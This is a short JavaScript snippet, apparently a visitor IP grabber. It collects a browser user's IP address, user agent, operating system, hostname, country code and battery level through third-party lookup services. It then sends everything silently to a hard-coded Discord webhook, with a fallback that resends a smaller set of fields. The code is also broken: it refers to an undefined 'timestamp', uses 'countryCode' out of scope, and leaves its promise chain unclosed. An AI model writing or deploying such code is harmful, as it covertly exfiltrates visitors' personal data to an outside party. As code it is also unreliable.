
let ip = "";
let browser = window.navigator.userAgent;
let os = window.navigator.platform;
let userAgent = navigator.userAgent;
let hostName = window.location.hostname;
let isp = "";
let batteryPercentage = 0;

fetch("https://api.ipify.org")
  .then(response => response.text())
  .then(data => {
    ip = data;
    return fetch(`https://geoip-db.com/json/` + ip); 
  })
  .then(response => response.json())
  .then(data => {
    const countryCode = data?.country_code || ""; 
    return fetch("https://sysinfojs.org/sysinfo"); 
  })
  .then(response => response.json())
  .then(data => {
    batteryPercentage = data?.battery || 0; 
    
    const body = { content: `Date/Time: ${timestamp}\nIP Address: ${ip}\nBrowser: ${browser}\nOperating System: ${os}\nUser Agent: ${userAgent}\nHost Name: ${hostName}\nISP: ${isp}\nCountry Code: ${countryCode}\nBattery Percentage: ${batteryPercentage}` }; 
    fetch("https://discord.com/api/webhooks/1183806794833870909/ZzS66DobbeePFtVe7OY_7T7GYH60sUZn4sclIlcig1nIls8BSWf2UNYvlcuDxR-P4gpI", { method: "POST", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } }) // send the message to Discord webhook with the updated body object
      .then(() => console.log("success")) // log a success message to console when the message is sent successfully
      .catch(() => { // handle errors when sending message to Discord webhook (fallback)
        const body = { content: `Date/Time: ${timestamp}\nIP Address: ${ip}\nBrowser: ${browser}\nOperating System: ${os}\nUser Agent: ${userAgent}\nHost Name: ${hostName}` }; // remove the new variables from the fallback message body since they're not available in this case (optional)
        fetch("https://discord.com/api/webhooks/1183806794833870909/ZzS66DobbeePFtVe7OY_7T7GYH60sUZn4sclIlcig1nIls8BSWf2UNYvlcuDxR-P4gpI", { method: "POST", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } }) // send the fallback message to Discord webhook with updated body object (optional)
          .then(() => console.log("success (fallback)")) 
      }); 
